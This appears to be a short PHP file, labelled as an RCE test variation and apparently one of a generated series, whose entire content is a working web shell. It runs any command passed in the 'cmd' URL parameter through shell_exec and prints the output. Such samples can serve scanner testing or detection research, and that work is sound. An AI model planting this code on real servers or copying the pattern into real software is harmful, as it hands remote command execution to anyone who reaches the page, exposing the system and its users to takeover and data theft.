<?php
// RCE test variation #1332
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>